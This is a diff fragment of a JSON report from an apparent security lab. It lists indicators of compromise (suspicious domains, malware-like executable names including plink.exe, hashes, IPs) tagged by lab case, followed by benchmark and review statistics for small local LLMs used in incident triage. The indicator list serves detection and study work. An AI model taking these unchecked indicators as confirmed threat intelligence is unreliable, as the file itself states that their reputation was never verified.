+    {
+      "type": "domain",
+      "value": "steamcommunity.com",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "update.lab.test",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "washyceehsu.lat",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "2r8602.exe",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "BRE6BgE2JubB.exe",
+      "cases": [
+        "RT-04"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "N1F90.exe",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "a.exe",
+      "cases": [
+        "RT-04"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "plink.exe",
+      "cases": [
+        "RT-01"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "imphash",
+      "value": "2eabe9054cad5152567f0699947a2c5b",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "10.0.2.17",
+      "cases": [
+        "RT-02"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "10.0.2.18",
+      "cases": [
+        "RT-01"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "10.0.255.12",
+      "cases": [
+        "LT-03"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "104.80.2.104",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": "public/other",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "127.0.0.2",
+      "cases": [
+        "RT-01"
+      ],
+      "scope": "loopback",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.1.199",
+      "cases": [
+        "NT-03"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.16.130",
+      "cases": [
+        "NT-01"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.16.131",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.171.129",
+      "cases": [
+        "SIEM-WEB-004"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "255.102.154.224",
+      "cases": [
+        "SIEM-WEB-001"
+      ],
+      "scope": "reserved (240.0.0.0/4) - not routable",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "46.101.251.172",
+      "cases": [
+        "NT-03"
+      ],
+      "scope": "public/other",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "81.2.248.189",
+      "cases": [
+        "NT-03"
+      ],
+      "scope": "public/other",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "94.124.107.190",
+      "cases": [
+        "NT-03"
+      ],
+      "scope": "public/other",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "sha256",
+      "value": "a1a79febe636f6af95ca527bf37321a329f37bc2524414376f2727f4d9bd17c1",
+      "cases": [
+        "SIEM-MAL-003"
+      ],
+      "scope": null,
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.16.1",
+      "cases": [
+        "NT-01",
+        "NT-02"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "attackrange.local",
+      "cases": [
+        "SIEM-EXCH-005"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "connectivity-check.ubuntu.com",
+      "cases": [
+        "NT-02"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "dc1.insecurebank.local",
+      "cases": [
+        "RT-03"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "pc01.example.corp",
+      "cases": [
+        "RT-01"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "domain",
+      "value": "win-77ltaphiq1r.example.corp",
+      "cases": [
+        "RT-02"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "email",
+      "value": "Administrator@attackrange.local",
+      "cases": [
+        "SIEM-EXCH-005"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "cmd.exe",
+      "cases": [
+        "RT-03"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "explorer.exe",
+      "cases": [
+        "RT-04"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "ipconfig.exe",
+      "cases": [
+        "RT-03"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "mscorsvw.exe",
+      "cases": [
+        "BT-01"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "userinit.exe",
+      "cases": [
+        "RT-04"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "winlogon.exe",
+      "cases": [
+        "RT-04"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "filename",
+      "value": "winrshost.exe",
+      "cases": [
+        "RT-03"
+      ],
+      "scope": null,
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    }
+  ],
+  "cross_case_overlaps": [
+    {
+      "type": "ipv4",
+      "value": "183.62.140.253",
+      "cases": [
+        "LT-01",
+        "SIEM-AUTH-002"
+      ],
+      "scope": "public/other",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.16.132",
+      "cases": [
+        "NT-01",
+        "NT-02"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "indicator",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    },
+    {
+      "type": "ipv4",
+      "value": "192.168.16.1",
+      "cases": [
+        "NT-01",
+        "NT-02"
+      ],
+      "scope": "private (RFC 1918)",
+      "role": "context",
+      "reputation": "not checked (no live threat-intelligence feed in lab)"
+    }
+  ],
+  "timeline_events": 192,
+  "week1_benchmark": {
+    "models": [
+      {
+        "model": "llama3.2:3b",
+        "baseline_runs": 7,
+        "avg_wall_time_s": 12.57,
+        "avg_tokens_per_sec": 48.99,
+        "avg_auto_recall": 0.69,
+        "vram_gb": 2.56,
+        "gpu_offload_pct": 100.0,
+        "manual_reviews": 13,
+        "manual_quality_mean": 1.77,
+        "manual_unsupported_severity_mean": 1.23
+      },
+      {
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "baseline_runs": 6,
+        "avg_wall_time_s": 31.71,
+        "avg_tokens_per_sec": 23.1,
+        "avg_auto_recall": 0.75,
+        "vram_gb": 4.3,
+        "gpu_offload_pct": 89.0,
+        "manual_reviews": 13,
+        "manual_quality_mean": 2.77,
+        "manual_unsupported_severity_mean": 0.77
+      },
+      {
+        "model": "phi3:mini",
+        "baseline_runs": 6,
+        "avg_wall_time_s": 22.1,
+        "avg_tokens_per_sec": 42.32,
+        "avg_auto_recall": 0.73,
+        "vram_gb": 3.81,
+        "gpu_offload_pct": 100.0,
+        "manual_reviews": 13,
+        "manual_quality_mean": 2.08,
+        "manual_unsupported_severity_mean": 2.23
+      }
+    ],
+    "selected_model": "mistral:7b-instruct-v0.3-q4_K_S",
+    "sources": [
+      "Week-1/Benchmarks/results/run_20261016_061045/summary.csv",
+      "Week-1/Benchmarks/results/run_20261016_061045/results.csv",
+      "Week-1/Testing/Additional-6-Manual-Review.csv",
+      "Week-1/Benchmarks/results/run_20261016_063533/results.csv",
+      "Week-1/Benchmarks/results/run_20261016_063843/results.csv"
+    ],
+    "note": "Manual quality = human review score (1-5). Automatic recall is a keyword check and is NOT accuracy (Week-1 finding)."
+  },
+  "week2_quality": {
+    "analysis_runs": 53,
+    "review_status_counts": {
+      "Corrected": 26,
+      "Pending Review": 26,
+      "Approved": 1
+    },
+    "validator_flags_total": 158,
+    "validator_flags_by_severity": {
+      "high": 46,
+      "medium": 107,
+      "low": 5
+    },
+    "top_flag_checks": [
+      [
+        "missing_section",
+        46
+      ],
+      [
+        "finding_without_evidence_ref",
+        37
+      ],
+      [
+        "timeline_timestamp_mismatch",
+        26
+      ],
+      [
+        "timeline_row_without_ref",
+        12
+      ],
+      [
+        "nonexistent_evidence_ref",
+        8
+      ],
+      [
+        "unsupported_authorization_status",
+        5
+      ],
+      [
+        "output_truncated",
+        3
+      ],
+      [
+        "multiple_confidence_levels",
+        3
+      ]
+    ],
+    "reviewed_runs": 27,
+    "analyst_correct_findings": 109,
+    "analyst_incorrect_findings": 68,
+    "analyst_missing_evidence_items": 152,
+    "reviewed_runs_corrected": 26,
+    "reviewed_runs_approved": 1,
+    "mean_tokens_per_second": 16.14,
+    "mean_wall_seconds": 83.5,
+    "source": "Week-2/Results/AN-*/analysis.json"
+  },
+  "week2_siem_trigger_to_triage_seconds": {
+    "values": [
+      31.3,
+      28.6,
+      48.1,
+      40.1
+    ],
+    "mean": 37.0,
+    "note": "OpenObserve trigger _timestamp -> receiver generated_at_utc, read from Week-2 evidence JSON (historical replay)."
+  }
+}
